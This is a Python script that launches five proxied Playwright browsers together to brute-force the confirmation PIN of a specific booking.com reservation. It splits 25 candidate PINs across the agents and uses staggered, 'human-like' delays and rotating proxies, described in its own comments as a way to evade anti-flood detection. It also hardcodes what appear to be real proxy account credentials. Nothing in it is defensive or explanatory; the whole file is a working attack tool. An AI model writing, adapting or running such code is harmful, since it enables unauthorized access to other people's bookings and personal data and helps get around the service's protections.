#!/usr/bin/env python3
"""
🎯 SQUAD MANAGER - Multi-Agent Simultaneous Deployment
Squad A: 5 agents, 5 browsers, 25 PINs total
Anti-flood detection through distributed load
"""

import subprocess
import time
import json
import os
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

class SquadManager:
    def __init__(self):
        # TARGET INTEL
        self.booking_id = "5727559423"
        self.proxy_credentials = "customer-1proxylabs_atNPR:1proxylabs_atNPR1@pr.oxylabs.io:7777"
        
        # PIN ARSENAL (25 PINs - 1 is correct)
        self.all_pins = [
            "1552", "1614", "2088", "4983", "5611", 
            "6291", "1562", "7415", "2148", "7781", 
            "1688", "1797", "1759", "5585", "3008", 
            "2390", "2963", "1691", "1937", "7185", 
            "1560", "1322", "8948", "8518", "1749"
        ]
        
        # SQUAD CONFIGURATION
        self.squad_size = 5
        self.pins_per_agent = 5
        
        # LOGGING
        self.log_file = f"squad_log_{self.booking_id}.txt"
        self.success_file = f"SQUAD_SUCCESS_{self.booking_id}.json"
        
    def distribute_pins(self):
        """Distribute 25 PINs across 5 agents (5 PINs each)"""
        pin_batches = []
        for i in range(0, len(self.all_pins), self.pins_per_agent):
            batch = self.all_pins[i:i + self.pins_per_agent]
            pin_batches.append(batch)
        return pin_batches
    
    def create_agent_script(self, agent_id, pin_batch):
        """Create individual agent script for each squad member"""
        agent_file = f"squad_agent_{agent_id}.py"
        
        pins_string = ",".join(pin_batch)
        
        agent_script = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from playwright.sync_api import sync_playwright
import time
import json
import os
from datetime import datetime

# Agent Configuration
AGENT_ID = "{agent_id}"
BOOKING_ID = "{self.booking_id}"
PINS = {pin_batch}
WAIT_TIME = 10  # Human-like 10 second wait between attempts

# File paths
LOG_FILE = "squad_log.csv"
SUCCESS_FILE = "victory.json"
SCREEN_DIR = "screenshots"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    """Log result to unified squad log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"{{timestamp}},SQUAD_A,{{AGENT_ID}},{{BOOKING_ID}},{{pin}},{{result}},{{url}}\\n")

def log_success(pin, url):
    """Log success to dedicated success file"""
    success_data = {{
        "booking_id": BOOKING_ID,
        "success_pin": pin,
        "success_url": url,
        "agent": AGENT_ID,
        "squad": "A",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }}
    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(success_data, f, indent=2)

print(f"🤖 SQUAD AGENT {{AGENT_ID}} DEPLOYING...")
print(f"🎯 Target: {{BOOKING_ID}}")
print(f"🔑 Assigned PINs: {{PINS}}")
print(f"🛡️ Proxy: http://pr.oxylabs.io:7777")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
    proxy_config = {{
        "server": "http://pr.oxylabs.io:7777",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }}
    print(f"🛡️ STEALTH MODE: Proxy configured - {{proxy_config['server']}}")
    
    browser = p.chromium.launch(
        headless=False,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for i, pin in enumerate(PINS, 1):
        print(f"🔑 Agent {{AGENT_ID}} - Testing PIN {{i}}/{{len(PINS)}}: {{pin}}")
        
        try:
            # LOGIC 1: Open browser and wait until completely loaded
            print("🌐 Opening booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
            print("⏳ Waiting for page to load completely...")
            page.wait_for_load_state("networkidle")  # Wait until no network activity
            print("✅ Page loaded completely!")

            # LOGIC 2: Fill booking ID and PIN, then click continue
            print("📝 Looking for booking ID field...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
            print(f"📝 Filling booking ID: {{BOOKING_ID}}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            print(f"🔐 Filling PIN: {{pin}}")
            page.fill('input[placeholder="e.g. 1234"]', pin)
            
            print("🔍 Looking for Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")')
                print("✅ Clicking Continue button...")
                page.click('button:has-text("Continue")')
            except:
                page.wait_for_selector('button[type="submit"]')
                print("✅ Clicking Submit button...")
                page.click('button[type="submit"]')

            # LOGIC 3: Wait for results - either error banner OR URL change
            print("⏳ Waiting for results...")
            print("⏳ Giving extra time for page to redirect...")
            time.sleep(5)  # Extra wait for redirect
            
            # Wait for either success (URL change) or error banner to appear
            try:
                page.wait_for_function("""
                    () => {{
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null ||
                                          document.querySelector('.alert-danger') !== null;
                        
                        return urlChanged || errorBanner;
                    }}
                """, timeout=20000)
            except:
                print("⚠️ No clear result after 20s, checking current state...")

            # Check results
            current_url = page.url
            print(f"🔍 Current URL: {{current_url}}")
            
            # Check for various elements on the page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            
            # Check for SUCCESS: URL contains success indicators
            if ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                print(f"🎉 SUCCESS! PIN {{pin}} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {{current_url}}")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_SUCCESS_{{AGENT_ID}}.png")
                log_result(pin, "SUCCESS", current_url)
                log_success(pin, current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Mission accomplished!")
                break  # Stop testing, we found the PIN!
                
            # Check for FAILURE: error banner detected
            elif len(error_elements) > 0:
                print(f"❌ PIN {{pin}} is INCORRECT (error banner detected)")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_FAIL_{{AGENT_ID}}.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
                
            else:
                print(f"❓ Unknown result for PIN {{pin}}")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_UNKNOWN_{{AGENT_ID}}.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f"💥 Error with PIN {{pin}}: {{e}}")
            page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_EXCEPTION_{{AGENT_ID}}.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        # Human-like pause before next PIN (except for last PIN)
        if i < len(PINS):
            print(f"⏳ Human breathing... waiting {{WAIT_TIME}}s before next PIN...")
            time.sleep(WAIT_TIME)

    browser.close()
    print(f"🏠 Agent {{AGENT_ID}} mission complete")

print(f"\\n--- Agent {{AGENT_ID}} Summary ---")
print(f"Total attempts: {{len(PINS)}}")
print(f"Success: {{success_count}}")
print(f"Failure: {{fail_count}}")
print(f"Unknown: {{unknown_count}}")
print(f"Exception: {{exception_count}}")
'''
        
        with open(agent_file, 'w', encoding='utf-8') as f:
            f.write(agent_script)
        
        return agent_file
    
    def deploy_squad_a(self):
        """Deploy Squad A - 5 agents simultaneously"""
        print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                     🎯 SQUAD A DEPLOYMENT INITIATED 🎯                      ║
║                                                                              ║
║  Target Booking: {self.booking_id}                                          ║
║  Squad Size: {self.squad_size} agents                                       ║
║  Total PINs: {len(self.all_pins)} PINs                                      ║
║  Strategy: Simultaneous multi-browser assault                               ║
║  Anti-Detection: Distributed load pattern                                   ║
║                                                                              ║
║                      🚀 DEPLOYING SQUAD A! 🚀                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
        
        # Distribute PINs
        pin_batches = self.distribute_pins()
        
        # Create agent scripts
        agent_files = []
        for i, pin_batch in enumerate(pin_batches, 1):
            agent_file = self.create_agent_script(f"A{i}", pin_batch)
            agent_files.append(agent_file)
            print(f"{Fore.GREEN}✅ Agent A{i} created - PINs: {','.join(pin_batch)}{Style.RESET_ALL}")
        
        # Deploy all agents simultaneously
        processes = []
        print(f"\n{Fore.YELLOW}🚀 LAUNCHING ALL 5 AGENTS SIMULTANEOUSLY...{Style.RESET_ALL}")
        
        for i, agent_file in enumerate(agent_files, 1):
            print(f"{Fore.BLUE}🤖 Deploying Agent A{i}...{Style.RESET_ALL}")
            process = subprocess.Popen([r'.\venv\Scripts\python.exe', agent_file])
            processes.append(process)
            time.sleep(1)  # Small stagger to avoid resource collision
        
        print(f"\n{Fore.GREEN}🎯 ALL 5 AGENTS DEPLOYED! Monitoring for victory...{Style.RESET_ALL}")
        
        # Monitor for completion
        start_time = time.time()
        while True:
            # Check for success
            if os.path.exists(self.success_file):
                try:
                    with open(self.success_file, 'r') as f:
                        success_data = json.load(f)
                    
                    print(f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                      🎉 SQUAD A MISSION SUCCESS! 🎉                         ║
║                                                                              ║
║  Victorious Agent: {success_data['agent']}                                  ║
║  Winning PIN: {success_data['success_pin']}                                 ║
║  Target: {success_data['booking_id']}                                       ║
║  Mission Time: {time.time() - start_time:.1f} seconds                       ║
║                                                                              ║
║                         🏆 VICTORY ACHIEVED! 🏆                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
                    
                    # Terminate all processes
                    for process in processes:
                        try:
                            process.terminate()
                        except:
                            pass
                    break
                except:
                    pass
            
            # Check if all processes completed
            active_processes = [p for p in processes if p.poll() is None]
            if not active_processes:
                print(f"{Fore.YELLOW}🔍 All agents completed. Checking for results...{Style.RESET_ALL}")
                time.sleep(2)
                if not os.path.exists(self.success_file):
                    print(f"{Fore.RED}❌ No success detected. All PINs may be incorrect.{Style.RESET_ALL}")
                break
            
            # Status update every 30 seconds
            if int(time.time() - start_time) % 30 == 0:
                print(f"{Fore.CYAN}⏱️ Mission time: {time.time() - start_time:.0f}s - {len(active_processes)} agents active{Style.RESET_ALL}")
            
            time.sleep(1)
        
        # Clean up agent files
        for agent_file in agent_files:
            try:
                os.remove(agent_file)
            except:
                pass
        
        print(f"{Fore.CYAN}🧹 Squad A deployment complete. Agent files cleaned.{Style.RESET_ALL}")

if __name__ == "__main__":
    manager = SquadManager()
    manager.deploy_squad_a()
